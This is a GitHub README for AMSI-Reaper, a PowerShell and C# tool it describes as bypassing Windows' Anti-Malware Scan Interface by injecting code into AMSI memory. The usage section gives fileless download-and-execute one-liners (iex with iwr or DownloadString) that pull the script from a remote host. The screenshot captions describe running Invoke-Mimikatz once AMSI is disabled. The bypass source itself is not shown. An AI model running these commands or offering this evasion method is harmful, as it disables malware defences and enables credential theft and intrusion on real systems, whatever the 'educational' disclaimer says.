# AMSI-Reaper
![reaper](https://github.com/h0ru/AMSI-Reaper/assets/117091833/24861e69-df06-477d-8844-a0d4015ef830)
## Overview
- AMSI-Reaper is a tool developed in both PowerShell and C# (.NET Framework v4.0) designed to bypass the Anti-Malware Scan Interface [(AMSI)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) in Windows.
- AMSI is a built-in security feature in Windows that allows applications and services to integrate with antimalware products.
- By default, it provides a layer of protection against potentially malicious scripts and code executed in applications like PowerShell. 

## Features
- Bypass AMSI: AMSI-Reaper injects code into the memory of the AMSI components, preventing them from interfering with your scripts.
- PowerShell and C# Support: The tool is available in both [PowerShell](https://github.com/h0ru/AMSI-Reaper/blob/main/src/AMSI-Reaper.ps1) and [C#](https://github.com/h0ru/AMSI-Reaper/blob/main/src/AMSI-Reaper.cs) versions, making it adaptable to different use cases.

## Usage
- *__AMSI-Reaper requires Administrator privileges to function correctly. Please run the tool as an Administrator.__*
### PowerShell Version
- __Download__
```
iex (iwr https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.ps1)
```
```
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.ps1')
```
### C# Version
- __Download__
```
wget https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.cs -O AMSI-Reaper.cs
```
```
iwr https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.cs -O AMSI-Reaper.cs
```
- __Compile__
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe AMSI-Reaper.cs
```
## Disclaimer
- *__The AMSI-Reaper tool is meant for educational and research purposes only. The author is not responsible for any misuse, damage, or legal consequences caused by the use of this tool.__*

## Images
- *Invoke-Mimikatz is detected and blocked by AMSI*
![image1](https://github.com/h0ru/AMSI-Reaper/assets/117091833/6dba8127-9fec-41ec-ba8d-f70d01678dea)
- *With AMSI-Reaper in PowerShell, we can request and use it from the command line in real-time, all in memory.*
![image2](https://github.com/h0ru/AMSI-Reaper/assets/117091833/dbcf74d0-a3c3-4e64-a024-3b2bea604f37)
- *Alternatively, you can also use AMSI-Reaper in C# with native Windows features by compiling it with csc.*
![image3](https://github.com/h0ru/AMSI-Reaper/assets/117091833/8906a6ab-d2d8-4ace-906c-2e0869040aa7)
